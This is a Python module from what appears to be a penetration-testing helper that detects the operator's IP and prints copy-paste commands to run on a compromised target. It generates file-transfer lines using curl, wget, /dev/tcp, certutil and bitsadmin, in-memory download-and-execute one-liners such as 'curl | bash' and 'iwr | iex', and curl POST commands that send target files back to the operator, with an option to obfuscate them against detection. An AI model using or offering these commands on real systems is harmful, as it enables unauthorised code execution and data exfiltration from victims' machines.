"""Local IP detection and interface picker."""

import os
import re
import subprocess
import sys
from urllib.parse import urlparse

# ANSI colors (only used when stderr is a tty)
def _c(code: str) -> str:
    return code if sys.stderr.isatty() else ""


BOLD = _c("\033[1m")
DIM = _c("\033[2m")
CYAN = _c("\033[36m")
GREEN = _c("\033[32m")
YELLOW = _c("\033[33m")
BLUE = _c("\033[34m")
RESET = _c("\033[0m")


def get_all_interfaces() -> list[tuple[str, str]]:
    """Return list of (interface_name, ipv4) excluding lo."""
    out = subprocess.run(
        ["ip", "-4", "addr", "show"],
        capture_output=True,
        text=True,
        timeout=2,
    )
    if out.returncode != 0:
        return []
    current_iface = None
    result = []
    for line in out.stdout.splitlines():
        if line and not line[0].isspace():
            parts = line.split(":", 2)
            current_iface = parts[1].strip() if len(parts) > 1 else None
        if current_iface and current_iface != "lo":
            m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", line)
            if m:
                result.append((current_iface, m.group(1)))
    return result


def _pick_interface_fzf(choices: list[tuple[str, str]]) -> str | None:
    """Use fzf to pick one; return selected ip or None."""
    lines = [f"{name}  {ip}" for name, ip in choices]
    try:
        p = subprocess.run(
            ["fzf", "--height", "10", "-1", "--prompt", "interface: "],
            input="\n".join(lines),
            stdout=subprocess.PIPE,
            stderr=None,
            text=True,
            timeout=30,
        )
        if p.returncode != 0 or not p.stdout.strip():
            return None
        selected = p.stdout.strip()
        for name, ip in choices:
            if f"{name}  {ip}" == selected or ip == selected:
                return ip
        if re.match(r"^\d+\.\d+\.\d+\.\d+$", selected):
            return selected
        parts = selected.split()
        return parts[-1] if parts and re.match(r"^\d+\.\d+\.\d+\.\d+$", parts[-1]) else None
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None


def _pick_interface_menu(choices: list[tuple[str, str]]) -> str | None:
    """Numbered menu on stderr; return selected ip or None."""
    for i, (name, ip) in enumerate(choices, 1):
        sys.stderr.write(f"  {i}) {name}  {ip}\n")
    sys.stderr.write("  choice (1-{}): ".format(len(choices)))
    sys.stderr.flush()
    try:
        line = input().strip()
        idx = int(line)
        if 1 <= idx <= len(choices):
            return choices[idx - 1][1]
    except (ValueError, EOFError):
        pass
    return None


def pick_platform() -> str | None:
    """Fuzzy pick Windows or GNU/Linux; return 'windows' or 'linux', or None to show both."""
    if not sys.stderr.isatty():
        return None
    choices = [("Windows", "windows"), ("GNU/Linux", "linux")]
    lines = [label for label, _ in choices]
    try:
        p = subprocess.run(
            ["fzf", "--height", "5", "-1", "--prompt", "platform: "],
            input="\n".join(lines),
            stdout=subprocess.PIPE,
            stderr=None,
            text=True,
            timeout=30,
        )
        if p.returncode != 0 or not p.stdout.strip():
            return None
        selected = p.stdout.strip().lower()
        if selected == "windows":
            return "windows"
        if selected in ("linux", "gnu/linux"):
            return "linux"
        return None
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    sys.stderr.write("\n  platform: 1) Windows  2) GNU/Linux  [1/2]: ")
    sys.stderr.flush()
    try:
        line = input().strip() or "1"
        if line == "2":
            return "linux"
        return "windows"
    except EOFError:
        return None


def pick_interface() -> str | None:
    """Show fuzzy finder or menu to select interface; return its IPv4 or None."""
    choices = get_all_interfaces()
    if not choices:
        return None
    if len(choices) == 1:
        return choices[0][1]
    if not sys.stderr.isatty():
        return get_local_ip()
    return _pick_interface_fzf(choices) or _pick_interface_menu(choices)


def get_local_ip() -> str | None:
    """Return preferred local IPv4 (tun0 first, then first non-lo), or None."""
    ifaces = get_all_interfaces()
    for name, ip in ifaces:
        if name == "tun0":
            return ip
    return ifaces[0][1] if ifaces else None


def _port_proto(port: int, protocol: str) -> tuple[str, str]:
    port_opt = "" if port == 80 else f" -p {port}"
    proto_opt = "" if protocol == "http" else f" --protocol {protocol}"
    return port_opt, proto_opt


def _base_url(ip: str, port: int) -> str:
    scheme = "https" if port == 443 else "http"
    if port in (80, 443):
        return f"{scheme}://{ip}"
    return f"{scheme}://{ip}:{port}"


def get_serve_base(port: int, protocol: str = "http") -> tuple[str | None, str | None]:
    """Run platform and interface pickers; return (base_url, platform) or (None, None). No output."""
    platform = pick_platform()
    my_ip = pick_interface()
    if not my_ip:
        my_ip = get_local_ip()
    if not my_ip or protocol != "http":
        return (None, None)
    return (_base_url(my_ip, port), platform)


def _target_receive_linux(base: str, path: str = "/path/to/file", out: str = "/tmp/payload.bin") -> str:
    p = urlparse(base)
    host, port = p.hostname or "YOUR_IP", p.port or (443 if p.scheme == "https" else 80)
    dev_tcp = f"exec 3<>/dev/tcp/{host}/{port}; echo -e \"GET {path} HTTP/1.0\\n\\n\" >&3; cat <&3 > {out}"
    return f"curl -o {out} {base}{path}\nwget -O {out} {base}{path}\n{dev_tcp}"


def _target_receive_win(base: str, path: str = "/path/to/file", out: str = "out") -> str:
    url = f"{base}{path}"
    return (
        f"curl -o {out} {url}\n"
        f"wget -O {out} {url}\n"
        f"certutil -urlcache -split -f {url} {out}\n"
        f'iwr -Uri "{url}" -OutFile "{out}"\n'
        f'bitsadmin /transfer job /download /priority high "{url}" "{out}"'
    )


def _target_send_linux(base: str, path: str = "./file", name: str = "file") -> str:
    return f"curl -X POST --data-binary @{path} {base}/{name}"


def _target_send_win(base: str, path: str = "file", name: str = "file") -> str:
    return f"curl -X POST --data-binary @{path} {base}/{name}"


def _target_inmemory_linux(base: str, path: str = "/path/to/file") -> list[str]:
    """One-liners to download and execute in memory (no file on disk). Best for scripts."""
    url = base.rstrip("/") + path
    return [
        f"curl -s {url} | bash",
        f"wget -qO- {url} | bash",
    ]


def _target_inmemory_win(base: str, path: str = "/path/to/file") -> list[str]:
    """One-liners to download and execute in memory (no file on disk). Best for PowerShell scripts."""
    url = base.rstrip("/") + path
    return [
        f"iwr -Uri \"{url}\" -UseBasicParsing | iex",
        f"(New-Object Net.WebClient).DownloadString(\"{url}\") | iex",
    ]


def pick_file_to_serve(dir_abs: str) -> str | None:
    """Fuzzy-pick a file under dir_abs; return relative path or None."""
    files: list[str] = []
    for root, _dirs, names in os.walk(dir_abs):
        rel_root = os.path.relpath(root, dir_abs)
        if rel_root == ".":
            rel_root = ""
        for name in names:
            path = os.path.join(rel_root, name) if rel_root else name
            files.append(path)
    if not files:
        return None
    try:
        p = subprocess.run(
            ["fzf", "--height", "15", "-1", "--prompt", "file to serve: "],
            input="\n".join(sorted(files)),
            stdout=subprocess.PIPE,
            stderr=None,
            text=True,
            timeout=60,
            cwd=dir_abs,
        )
        if p.returncode != 0 or not p.stdout.strip():
            return None
        return p.stdout.strip()
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None


def _write_section(
    title: str, emoji: str, lines: list[str], obfuscate: bool = False
) -> None:
    sys.stderr.write(f"\n  {YELLOW}{BOLD}{emoji} {title}{RESET}\n")
    for line in lines:
        if obfuscate:
            from .obfuscate_ import obfuscate_bash, obfuscate_powershell
            if any(
                x in line
                for x in (
                    "iwr",
                    "iex",
                    "certutil",
                    "bitsadmin",
                    "OutFile",
                    "WebClient",
                    "Invoke-",
                    "Net.WebClient",
                )
            ):
                line = obfuscate_powershell(line)
            else:
                line = obfuscate_bash(line)
            sys.stdout.write(line + "\n")
        else:
            sys.stderr.write(f"  {CYAN}{line}{RESET}\n")


def print_commands_serve(
    port: int,
    protocol: str = "http",
    serve_path: str | None = None,
    _base: str | None = None,
    _platform: str | None = None,
    obfuscate: bool = False,
) -> tuple[str | None, str | None]:
    """Print copy-paste commands for target. When obfuscate=True, obfuscated commands go to stdout only."""
    if _base is None or _platform is None:
        return (None, None)
    base = _base
    platform = _platform
    url_path = ("/" + serve_path) if serve_path else "/path/to/file"
    path_display = serve_path if serve_path else "path/to/file"
    name_display = path_display.split("/")[-1] if path_display else "file"
    out_linux = f"/tmp/{name_display}"
    out_win = name_display
    send_path = "path/to/file"
    send_name = "path/to/file"
    sys.stderr.write(f"\n  {BOLD}📋 Run on target (copy-paste):{RESET}\n")
    if serve_path:
        sys.stderr.write(f"  {DIM}📁 {path_display} — server exits after download{RESET}\n")
    if platform in (None, "linux"):
        recv_lines = _target_receive_linux(base, path=url_path, out=out_linux).strip().split("\n")
        send_lines = [_target_send_linux(base, path=f"./{send_path}", name=send_name)]
        _write_section("GNU/Linux — receive (curl, wget, bash)", "🐧 ⬇️", recv_lines, obfuscate)
        _write_section("GNU/Linux — in-memory execute (curl | bash, wget | bash)", "🐧 💾", _target_inmemory_linux(base, path=url_path), obfuscate)
        _write_section("GNU/Linux — send", "🐧 ⬆️", send_lines, obfuscate)
    if platform in (None, "windows"):
        recv_lines = _target_receive_win(base, path=url_path, out=out_win).strip().split("\n")
        send_lines = [_target_send_win(base, path=send_path, name=send_name)]
        _write_section("Windows — receive (curl, wget, certutil, iwr, bitsadmin)", "🪟 ⬇️", recv_lines, obfuscate)
        _write_section("Windows — in-memory execute (iwr | iex, WebClient)", "🪟 💾", _target_inmemory_win(base, path=url_path), obfuscate)
        _write_section("Windows — send", "🪟 ⬆️", send_lines, obfuscate)
    sys.stderr.write("\n")
    sys.stderr.flush()
    if obfuscate:
        sys.stdout.flush()
    return (base, platform)


def print_commands_receive_listen(
    port: int, protocol: str = "http", obfuscate: bool = False
) -> None:
    """Print copy-paste for target to POST file to you (host is listening)."""
    platform = pick_platform()
    my_ip = pick_interface()
    if not my_ip or protocol != "http":
        return
    base = _base_url(my_ip, port)
    sys.stderr.write(f"\n  {BOLD}📋 Run on target (POST file to you):{RESET}\n")
    if platform in (None, "linux"):
        _write_section("GNU/Linux — send", "🐧 ⬆️", [_target_send_linux(base)], obfuscate)
    if platform in (None, "windows"):
        _write_section("Windows — send", "🪟 ⬆️", [_target_send_win(base)], obfuscate)
    sys.stderr.write("\n")
    if obfuscate:
        sys.stdout.flush()
